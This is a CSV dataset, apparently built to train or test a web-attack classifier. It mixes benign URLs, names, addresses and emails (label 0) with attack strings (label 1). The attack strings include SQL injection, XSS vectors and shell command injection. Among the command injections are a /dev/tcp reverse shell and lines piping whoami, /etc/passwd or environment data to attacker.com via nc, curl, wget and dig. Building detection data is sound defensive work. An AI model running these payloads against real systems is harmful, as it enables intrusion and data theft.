payload,label
/home?user=hải198,0
/product/detail?page=123631,0
"1%""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",1
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,1
<!--[if gte IE 4]>,1
konstanc,0
'; whoami; ',1
/product/detail?user=123269,0
robin@comerciosdeaspe.info,0
/assets/style.css?q=admin848,0
mockus@twinjet.hr,0
/login.html?q=kma714,0
/.//././/././/./{file},1
/product/detail?page=admin122,0
/api/v1/auth?token=2iculx13,0
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""jcyh""=""jcyh",1
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('pehq' like 'pehq,1
"1'||(select 'ufgs' where 9670=9670 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",1
calle federico mompou 144 11-d,0
/team/verona/8NH6Idnt/statistics,0
'; who'am'i; ',1
/product/detail?q=contact996,0
bohlen_newtell@lodgemadrid.it,0
sant vicen de castellet,0
/login.html?user=contact978,0
martinez,0
envelar,0
/api/v1/users?page=book543,0
/login?redirect_url=/dashboard/user/593579,0
38350,0
villamuriel de cerrato,0
/login?redirect_url=/dashboard/user/150225,0
despuig,0
breceda perdig,0
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end))",1
waring,0
"1"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1
"-2254') as dyrv where 9079=9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",1
9789,0
83178933p,0
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#,1
/login?redirect_url=/dashboard/user/930813,0
/index.php?category=2026984,0
"calle los tipografos, 98, 4g",0
49660,0
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",1
kops@estarencasa.bb,0
piel,0
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
bears,0
castejn de henares,0
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",1
1%'))) or 4240=(select 4240 from pg_sleep(5))--,1
a`whoami`,1
quicena,0
"1%"" waitfor delay '0:0:5'--",1
pedro de la gasca 140,0
"calle salvador de madariaga s/n,",0
/search?user=book820,0
"glorieta valle de oro, 9 10a",0
"-5640"")) or 9792=2728--",1
/assets/style.css?q=kma90,0
/api/v1/auth?token=gKkEtfhJ,0
/api/v1/auth?token=itWZ9oXr,0
/api/v1/auth?token=7OND6tus,0
/login?redirect_url=/dashboard/user/256538,0
1') where 1183=1183;select sleep(5)--,1
/assets/style.css?token=apple995,0
"-4477')) union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1
42112,0
besnehard8@itrends.tn,0
"jose maria mortes lerma, 151 11-d",0
"1) as zdym where 1578=1578 union all select null,null,null#",1
paracuellos de jarama,0
sirola@professionalhost.cc,0
"<STYLE>BODY{-moz-binding:url(""http://vulnerability-lab.com/CrossSiteScriptingmoz.xml#CrossSiteScripting"")}</STYLE>",1
"1%')));iif(4638=8258,1,1/0)",1
hube@gemas.org.aero,0
montaesismo,0
mauricio,0
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",1
danciel,0
5176134649632043,0
desnarigada,0
02660,0
/product?id=843839&utm_source=facebook&campaign=sale,0
/team/verona/5pNYliL0/statistics,0
7912641322144923,0
08614,0
/team/verona/Rj5wMoHr/statistics,0
/login?redirect_url=/dashboard/user/892392,0
/assets/style.css?q=contact65,0
9a7bl1,0
denotativo,0
"-3445 union all select 5505,5505,5505--",1
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'nwdk' like 'nwdk",1
30,0
clay9@showcars.cz,0
sau nobrega,0
/product?id=140662&utm_source=facebook&campaign=sale,0
1' where 4134=4134 and 1102=6300--,1
31587,0
1'))) and 7533=7533 and ((('hoyw'='hoyw,1
1'));begin user_lock.sleep(5); end--,1
/product?id=148725&utm_source=facebook&campaign=sale,0
"-2325) union all select 4692,4692,4692,4692#",1
arnaldo,0
henry,0
"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",1
/product?id=585677&utm_source=facebook&campaign=sale,0
"1"")) and make_set(1167=5027,5027) and ((""grfi""=""grfi",1
7231,0
prouty@gnuez.zw,0
49130,0
2930629510541352,0
/index.php?token=hải700,0
gallenbe7,0
13191,0
"1' where 2123=2123 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
8755728520539974,0
con79lecimie91o,0
marye@theroxyblue.mr,0
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""ladc"" like ""ladc",1
38370,0
/search?q=contact976,0
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('ngwt'='ngwt",1
& sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
"-8734%"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",1
"c/ fontanelles, 196,",0
molina,0
973,0
-2749') as fiho where 3531=3531 or 2777=1485#,1
/team/verona/nApGw1Hz/statistics,0
incesta$r,0
/product?id=511758&utm_source=facebook&campaign=sale,0
deleandra,0
/product?id=941513&utm_source=facebook&campaign=sale,0
c4l6716o,0
3740768702287666,0
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",1
|| echo vulnerable,1
/product?id=724314&utm_source=facebook&campaign=sale,0
mary-ann,0
"-6096') where 1316=1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1
"1"") and make_set(8403=8403,8899) and (""dhss""=""dhss",1
/login?redirect_url=/dashboard/user/756334,0
/api/v1/users?id=apple931,0
id=xss src= <img 6;avascript:alert('xss')>,1
/api/v1/users?q=contact318,0
"-3729')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('czed'='czed",1
76591879q,0
/index.php?page=shoes256,0
/api/v1/users?user=book125,0
"1) as zodp where 9112=9112;select count(*) from generate_series(1,5000000)--",1
/index.php?page=profile787,0
/index.php?token=contact841,0
patanera,0
"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1
"1%')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='",1
mirambell donet,0
/assets/style.css?q=apple935,0
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",1
"1%' or elt(6272=6272,sleep(5)) and '%'='",1
3096,0
1';select pg_sleep(5) and 'rpka'='rpka,1
/search?page=contact308,0
1'+(select rdwb where 2498=2498 and 3429=7639--,1
vizcaya,0
74566884x,0
%0d$(whoami),1
berky,0
$( ping -c 30 127.0.0.1 ),1
"1') union all select null,null,null,null,null--",1
/team/verona/6rupn5SU/statistics,0
calle estafeta 105 6c,0
traspilla*r,0
13270596x,0
/product/detail?category=apple15,0
01116944h,0
adnado,0
jackelyn,0
"alcalde esteban minguez, 169, 12?b",0
choclo,0
"-5761"") or 3762=1274",1
palacio@eldeseodepecar.kn,0
/product?id=966255&utm_source=facebook&campaign=sale,0
8961254211923124,0
solana de los barros,0
94534158h,0
/assets/style.css?q=12319,0
/product/detail?category=12349,0
"-9265"") or 7834=1685",1
rickie,0
|| whoami | nc attacker.com 4444,1
manganiello arias,0
"1%"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""%""=""",1
quest@palmatraducciones.pw,0
"-7744""))) union all select 9408,9408,9408,9408--",1
/product?id=343144&utm_source=facebook&campaign=sale,0
espejn,0
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""ampn"" like ""ampn",1
gillespie@deuxmanagement.web,0
/api/v1/auth?token=Wvu382zs,0
/index.php?user=kma518,0
jamaly,0
/product?id=207341&utm_source=facebook&campaign=sale,0
xiaojing,0
2912546166098887,0
"c/ torcuato perez, 69,",0
1') as cdrm where 4595=4595 order by 1#,1
"calle conesa balanza 138, 9?c",0
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",1
"c/ meneses, 104 6-a",0
42ache,0
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg",1
aposesionar,0
"1%') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",1
"1'))) and make_set(8403=8403,8899) and ((('llfp'='llfp",1
/team/verona/dMLGtxzt/statistics,0
kwangchi,0
16670,0
leshowit,0
amarr1,0
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky",1
""") OR ""1""=""1""#",1
'; whoami${IFS}; ',1
"-8924)) as jybr where 7901=7901 or elt(1032=1032,3623)--",1
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'fbzo' like 'fbzo,1
-9103' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'nlvq'='nlvq,1
/api/v1/users?id=123216,0
/login.html?q=apple559,0
aniano,0
1' where 8635=8635 order by 1--,1
"av. benisa 43, 10d",0
1' AND 1=2,1
aldemar,0
/home?q=hải406,0
32425777d,0
/product?id=508107&utm_source=facebook&campaign=sale,0
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",1
7812372382354284,0
/api/v1/auth?token=uuNDHwha,0
"calle guadamacileros, 24 6-c",0
34964894h,0
lu,0
/api/v1/users?page=contact779,0
lilley@intelethernet.ic,0
"orellana, 98,",0
& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com,1
poblacin de arroyo,0
filogamo@copiar.com.nu,0
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
/home?user=book624,0
"logroo, 98, 5-d",0
46084,0
&& net user,1
igns anzoategui,0
santo domingo de las posadas,0
roberto,0
claudio,0
-9847%'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',1
/login?redirect_url=/dashboard/user/399943,0
batobrina.falkenstein@ebs-construcciones.sv,0
3151,0
sergyl@intercambiodeenlaces.gh,0
selbrede,0
mylong@deltamarina.aq,0
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
miriamne,0
"-9145%'))) or make_set(9017=9368,9368) and ((('%'='",1
"c/ de las gloxinias 91,",0
/product/detail?category=book336,0
/search?q=hải487,0
/team/verona/ClU7Bfgd/statistics,0
acampo,0
/api/v1/users?id=123740,0
somer@hotelsardegna.tg,0
"1)));select benchmark(5000000,md5(0x714e4153))#",1
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",1
89416530m,0
/product/detail?token=contact624,0
4574,0
ridgley,0
/index.php?q=12378,0
%0d id,1
braa,0
ilijev@mauroman.tc,0
alpuche simani,0
/team/verona/71hWkj1V/statistics,0
1%'))) and 3916=6327--,1
/api/v1/users?q=contact5,0
1' where 7191=7191 rlike sleep(5)--,1
/team/verona/yO19N9NM/statistics,0
/index.php?q=profile972,0
arstides,0
/search?page=apple95,0
/home?page=profile751,0
%3ciMg+SrC%3dx+OnErRoR%3dalert(51336)%3e,1
"1%"")) union all select null,null,null,null,null,null,null,null#",1
"1"" and 8594=(select 8594 from pg_sleep(5))--",1
solana,0
"1%"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",1
ma724-3ra,0
"1%"") and sleep(5) and (""%""=""",1
"1,(select * from generate_series(5609,5609,case when (5609=5609) then 1 else 0 end) limit 1)",1
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",1
boothe,0
37068097d,0
/api/v1/auth?token=YdG4RfX2,0
/team/verona/GqmnKQWP/statistics,0
| wget http://attacker.com/$(pwd | tr '/' '-'),1
6721,0
posa mura,0
07250,0
/assets/style.css?token=kma929,0
3311,0
32806661j,0
/login?redirect_url=/dashboard/user/239910,0
/login.html?page=book277,0
arquitectnico,0
/login.html?q=book90,0
barbimore_na,0
"1%'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",1
/product?id=59712&utm_source=facebook&campaign=sale,0
zigrand,0
torre alhquime,0
&& dig $(id).attacker.com,1
05147,0
alicanto,0
/product?id=135157&utm_source=facebook&campaign=sale,0
1'||(select 'boxx' where 2038=2038 and 9198=9198--,1
/api/v1/auth?token=ogz1qyUD,0
/product?id=861585&utm_source=facebook&campaign=sale,0
"1' where 9003=9003 and make_set(5868=8316,8316)--",1
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
/team/verona/vAR1U0eW/statistics,0
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"1') where 8268=8268 union all select null,null,null,null--",1
14188360m,0
|| curl,1
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('pneh' like 'pneh,1
/login?redirect_url=/dashboard/user/395305,0
/index.php?q=profile486,0
r14orsi1a,0
"""; whoami; /*",1
/index.php?q=123328,0
/api/v1/users?q=admin405,0
nandor,0
saliva+jo,0
19492,0
ryszard,0
88215924e,0
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
18311,0
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('wqme'='wqme",1
/team/verona/qAEEQRDi/statistics,0
"-8128"")) as ovjz where 7375=7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1
"-1920'))) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",1
/login.html?category=123423,0
vilajosa larrumbe,0
anariva estradera,0
/api/v1/users?token=123136,0
-2402 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- szgq,1
"1%"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
1');waitfor delay '0:0:5'--,1
"perl -e 'print ""<IMG SRC=java\0script:alert(\""CrossSiteScripting\"")>"";' > out",1
endrinal,0
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",1
"1"") as vcir where 6275=6275 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
/search?category=book731,0
"c/ torregrossa, 3",0
/home?page=contact937,0
valeri arlat,0
thiessen,0
5244748375620408,0
6.r9b05o,0
/home?category=profile709,0
"1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",1
labra cheres,0
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",1
legros@muchapolicia.tw,0
/team/verona/WdIikyYq/statistics,0
cuccu@professionalhosting.com.uz,0
-2291)) or 4067=5666#,1
7953912981751706,0
15807509t,0
28730070b,0
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",1
valma,0
c/ emile robin 194 9?h,0
01633578a,0
80igm94016,0
hagerthy.gilling@inoxled.az,0
/index.php?token=profile804,0
1)) as mlpf where 7425=7425;select sleep(5)--,1
71196230y,0
ddima,0
">""<script <b>document.cookie=true;</script>",1
"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
/login?redirect_url=/dashboard/user/686528,0
ivey,0
/api/v1/users?q=shoes873,0
"1%""))) or (select * from (select(sleep(5)))ydpu) and (((""%""=""",1
"1);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (1491=1491",1
towney,0
/product?id=366362&utm_source=facebook&campaign=sale,0
/login?redirect_url=/dashboard/user/573136,0
4277,0
/product/detail?q=kma444,0
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (1185=1185",1
%0d cat /etc/passwd,1
con2e5u934e1215e,0
"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",1
griffith_chesbro@psykoterapeut.sn,0
"-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1))) union all select null,null,null,null,null,null,null--",1
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
; ping -c 5 127.0.0.1,1
"amargos, 17, 1?e",0
"1"")) union all select null,null,null,null,null,null,null,null,null--",1
07819871d,0
/team/verona/DNNTO0uX/statistics,0
/login.html?q=2026919,0
4087914907992137,0
/assets/style.css?category=2026386,0
"1 and elt(1210=1210,sleep(5))-- ommf",1
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('yaml'='yaml",1
/team/verona/X3F5E1Y3/statistics,0
"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",1
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",1
"1"")) order by 1--",1
` ps aux `,1
/team/verona/ATYjjkyd/statistics,0
"1%"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""=""",1
/login?redirect_url=/dashboard/user/719295,0
1918370923327655,0
"1"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
|| env,1
santa fe de mondjar,0
"1"")) as tljw where 8474=8474 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1
& echo $HOME,1
/login?redirect_url=/dashboard/user/159027,0
1942833835979671,0
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'tmdj' like 'tmdj",1
